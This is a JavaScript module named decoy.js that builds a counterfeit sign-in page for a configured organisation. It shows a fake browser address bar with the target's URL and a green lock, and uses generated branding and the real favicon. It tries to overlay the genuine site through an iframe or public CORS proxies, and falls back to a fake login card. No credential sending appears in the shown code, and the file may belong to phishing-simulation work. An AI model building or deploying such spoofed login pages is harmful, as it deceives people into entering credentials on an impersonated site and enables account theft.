/* ============================================================
   decoy.js — Loads the REAL target site (or a convincing fake)
   ============================================================
   Strategy order:
     1. Direct iframe  → pixel-perfect, but blocked if site sends
        X-Frame-Options / CSP frame-ancestors.
     2. CORS-proxy fetch → grab HTML, inject <base> tag, render
        via srcdoc iframe. Works for most sites.
     3. Fallback fake login → generated branded login card.
   ============================================================ */

const Decoy = (() => {

  let _cfg   = null;
  let _mode  = 'fake';          // 'iframe' | 'proxy' | 'fake'
  let _frame = null;            // reference to the real-site iframe

  /* ---- CORS proxy services (tried in order) ---- */
  const CORS_PROXIES = [
    url => `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
    url => `https://corsproxy.io/?${encodeURIComponent(url)}`,
    url => `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`,
  ];

  /* ==========================================================
     render() — Always sets up the branded fake login as a base
     ========================================================== */
  function render(cfg) {
    _cfg = cfg;

    // Page title
    document.title = `Sign in – ${cfg.orgName}`;

    // Fake address bar
    document.getElementById('fakeUrl').textContent = `https://${cfg.domain}${cfg.path}`;

    // Logo — generate an SVG letter-icon with the brand colour
    const logo = document.getElementById('decoyLogo');
    const svg  = generateLogoSvg(cfg.logoLetter, cfg.brandColor);
    logo.src   = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);

    // Title / subtitle
    document.getElementById('decoyTitle').textContent    = `Sign in to ${cfg.orgName}`;
    document.getElementById('decoySubtitle').textContent = `Use your ${cfg.orgName} account`;
    document.getElementById('decoyEmail').placeholder    = `user@${cfg.domain}`;

    // Footer
    document.getElementById('decoyFooter').innerHTML =
      `&copy; ${new Date().getFullYear()} ${cfg.orgName}. All rights reserved.`;

    // Accent colour on button
    const btn = document.getElementById('decoySubmit');
    btn.style.background = cfg.brandColor;

    // Favicon — try real favicon first, SVG fallback
    const fav = document.getElementById('favicon');
    const realFav = new Image();
    realFav.onload = () => { fav.href = realFav.src; };
    realFav.onerror = () => { fav.href = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg); };
    realFav.src = `https://www.google.com/s2/favicons?domain=${cfg.domain}&sz=64`;

    // Apply brand colour to fake address bar lock icon
    document.querySelector('.lock-icon').style.color = '#2e7d32';
  }

  /* ==========================================================
     loadRealSite() — Try to overlay the actual target website
     ========================================================== */
  async function loadRealSite(cfg) {
    const targetUrl = `https://${cfg.domain}${cfg.path}`;

    // Strategy 1: Direct iframe
    const iframeOk = await tryDirectIframe(targetUrl);
    if (iframeOk) { _mode = 'iframe'; return 'iframe'; }

    // Strategy 2: CORS proxy fetch → srcdoc
    const proxyOk = await tryProxyFetch(targetUrl, cfg.domain);
    if (proxyOk) { _mode = 'proxy'; return 'proxy'; }

    // Strategy 3: fake login is already rendered
    _mode = 'fake';
    return 'fake';
  }

  /* ---------- Strategy 1: Direct iframe ---------- */
  function tryDirectIframe(url) {
    return new Promise(resolve => {
      const iframe = document.createElement('iframe');
      iframe.id = 'realSiteFrame';
      iframe.className = 'real-site-frame';
      // Prevent frame-busting but allow normal page behaviour
      iframe.sandbox = 'allow-scripts allow-forms allow-same-origin allow-popups';
      iframe.referrerPolicy = 'no-referrer';
      iframe.loading = 'eager';

      let settled = false;

      const succeed = () => {
        if (settled) return;
        settled = true;
        _frame = iframe;
        iframe.classList.add('loaded');
        // Hide the fake login content behind
        const body = document.querySelector('.decoy-body');
        if (body) body.style.display = 'none';
        resolve(true);
      };

      const fail = () => {
        if (settled) return;
        settled = true;
        iframe.remove();
        resolve(false);
      };

      iframe.addEventListener('load', () => {
        try {
          // If we CAN read the location → same-origin (about:blank / error)
          const loc = iframe.contentWindow.location.href;
          // about:blank or empty means blocked
          if (!loc || loc === 'about:blank') { fail(); return; }
          // Rare: actually same-origin page loaded
          succeed();
        } catch (_e) {
          // SecurityError → cross-origin page loaded → real site!
          succeed();
        }
      });

      iframe.addEventListener('error', fail);

      // Timeout — if nothing happens in 5 s, give up
      setTimeout(() => { if (!settled) fail(); }, 5000);

      document.getElementById('decoy').appendChild(iframe);
      iframe.src = url;
    });
  }

  /* ---------- Strategy 2: CORS proxy → srcdoc ---------- */
  async function tryProxyFetch(targetUrl, domain) {
    for (const makeProxyUrl of CORS_PROXIES) {
      try {
        const proxyUrl = makeProxyUrl(targetUrl);
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 8000);

        const resp = await fetch(proxyUrl, { signal: ctrl.signal });
        clearTimeout(timer);

        if (!resp.ok) continue;
        let html = await resp.text();
        if (!html || html.length < 200) continue;

        // Inject <base> so relative URLs resolve to the real domain
        html = injectBaseTag(html, domain);
        // Neuter form actions so nothing actually submits
        html = neuterForms(html);
        // Block scripts from the proxied page to avoid errors
        html = neutraliseScripts(html);

        // Create srcdoc iframe
        const iframe = document.createElement('iframe');
        iframe.id = 'realSiteFrame';
        iframe.className = 'real-site-frame';
        iframe.sandbox = 'allow-same-origin';  // no scripts — static snapshot
        iframe.srcdoc = html;

        document.getElementById('decoy').appendChild(iframe);

        // Wait for render
        await new Promise(r => {
          iframe.addEventListener('load', r, { once: true });
          setTimeout(r, 4000);
        });

        _frame = iframe;
        iframe.classList.add('loaded');
        const body = document.querySelector('.decoy-body');
        if (body) body.style.display = 'none';
        return true;
      } catch (_e) {
        continue;
      }
    }
    return false;
  }

  /* ---------- HTML rewriting helpers ---------- */
  function injectBaseTag(html, domain) {
    const base = `https://${domain}`;
    const tag  = `<base href="${base}/">`;
    if (/<head[^>]*>/i.test(html))       return html.replace(/<head[^>]*>/i, `$&${tag}`);
    if (/<html[^>]*>/i.test(html))       return html.replace(/<html[^>]*>/i, `$&<head>${tag}</head>`);
    return `<head>${tag}</head>${html}`;
  }

  function neuterForms(html) {
    return html
      .replace(/(<form[^>]*?)action\s*=\s*"[^"]*"/gi, '$1action="javascript:void(0)"')
      .replace(/(<form[^>]*?)action\s*=\s*'[^']*'/gi, "$1action='javascript:void(0)'");
  }

  function neutraliseScripts(html) {
    // Replace <script> tags with inert versions so the static snapshot doesn't error
    return html.replace(/<script(\b[^>]*)>/gi, '<script type="text/blocked"$1>');
  }

  /* ---------- SVG logo helper ---------- */
  function generateLogoSvg(letter, color) {
    return `<svg xmlns="http://www.w3.org/2000/svg" width="56" height="56" viewBox="0 0 56 56">
      <rect width="56" height="56" rx="12" fill="${color}"/>
      <text x="28" y="38" text-anchor="middle" font-size="30" font-weight="700"
            fill="#fff" font-family="sans-serif">${letter}</text>
    </svg>`;
  }

  /* ==========================================================
     UI helpers
     ========================================================== */

  /** Show a brief spinner, then fire callback */
  function showSpinner(duration, cb) {
    const overlay = document.createElement('div');
    overlay.className = 'spinner-overlay';
    overlay.innerHTML = '<div class="spinner"></div>';
    document.body.appendChild(overlay);
    setTimeout(() => {
      overlay.remove();
      cb();
    }, duration);
  }

  /** Wire up the fake form (only relevant in 'fake' mode) */
  function bindForm(onSubmit) {
    const form = document.getElementById('decoyForm');
    if (form) {
      form.addEventListener('submit', e => {
        e.preventDefault();
        onSubmit();
      });
    }
  }

  /** Hide everything — decoy layer + real-site iframe */
  function hide() {
    document.getElementById('decoy').style.display = 'none';
    if (_frame) { _frame.remove(); _frame = null; }
  }

  /** Get the active mode for display */
  function getMode() { return _mode; }

  return { render, loadRealSite, bindForm, showSpinner, hide, getMode };
})();
